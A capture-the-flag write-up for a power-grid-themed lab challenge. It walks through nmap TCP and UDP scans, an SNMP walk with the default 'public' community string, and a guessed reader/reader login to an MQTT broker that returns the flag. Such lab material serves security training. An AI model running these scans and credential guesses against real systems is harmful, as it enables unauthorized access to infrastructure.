#  Sensor array (2 points)

Hi, emergency troubleshooter,

sensor data from the distribution network are being continuously transmitted
to `broker.powergrid.tcc`. However, the outsourced provider went bankrupt last
week, and no one else has knowledge of how to access these data. Find out how
to regain access to the sensor array data.

Stay grounded!

## Solution

Let's start with scanning what runs on the host we need to explore (do not
forget to scan all ports).

```text
$ nmap -p- broker.powergrid.tcc
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for broker.powergrid.tcc (10.99.25.50)
Host is up (0.011s latency).
Other addresses for broker.powergrid.tcc (not scanned): 2001:db8:7cc::25:50
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
1883/tcp open  mqtt
```

We can see that there is MQTT broker running on port 1883, so we can try
connecting there and listen to some messages (that are being continuously
transmitted as the task implies).

```text
$ mosquitto_sub -h broker.powergrid.tcc -p 1883 -t '#' -v
Connection error: Connection Refused: not authorised.
```

It seems that the connection requires some credentials. We can either try
guessing/enumerating the credentials, or we can realize, that we only scanned
TCP ports. So let's take a look what UDP scan reveals. For faster scan we can
restrict the ports being scanned to e.g. top 20, because UDP scan is much
slower. (Of course if we did not find anything, we should do a broader scan.)

```
$ nmap -sU --top-ports 20 --open broker.powergrid.tcc
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for broker.powergrid.tcc (10.99.25.50)
Host is up (0.012s latency).
Other addresses for broker.powergrid.tcc (not scanned): 2001:db8:7cc::25:50
Not shown: 19 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```

This time, it was enough and the scan reveals SNMP on poty 161. We can now add
`-sV` option for more details on that particular port.

```
$ nmap -sU -sV -p 161 broker.powergrid.tcc
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for broker.powergrid.tcc (10.99.25.50)
Host is up (0.0095s latency).
Other addresses for broker.powergrid.tcc (not scanned): 2001:db8:7cc::25:50

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: Mosquitto
```

This tells us that the SNMP responds to v1 requests (and v3) and that the
community string `public` works. We can use `snmpwalk` to explore it.

```
$ snmpwalk -v 1 -c public broker.powergrid.tcc
iso.3.6.1.2.1.1.1.0 = STRING: "MQTT broker for power grid sensors. Only reader has the rights to subscribe to a topic!"
iso.3.6.1.2.1.1.3.0 = Timeticks: (41542559) 4 days, 19:23:45.59
iso.3.6.1.2.1.1.5.0 = STRING: "Mosquitto"
iso.3.6.1.2.1.1.6.0 = STRING: "DC A, area 51"
iso.3.6.1.2.1.1.7.0 = INTEGER: 1
End of MIB
```

We have discovered, that `reader` has the rights to subscribe to a topic. So
let's try to check if it does not reuse the same value also as a password.

```
$ mosquitto_sub -h broker.powergrid.tcc -p 1883 -t '#' -v -u reader -P reader
sensors/dev3 TEST{84GL-Fm58-wE4P-rB54}
sensors/dev1 TEST{1vX4-7hk7-a16H-pi45}
sensors/dev2 TEST{bvX2-B8k7-3b6H-MY8p}
sensors/prod FLAG{0hs0-SiJm-TO5B-46HD}
```

As it turns out, this was really he case. Leaving the mqtt client running for
a while yields a couple of TEST messages, followed by the flag we're looking
for.
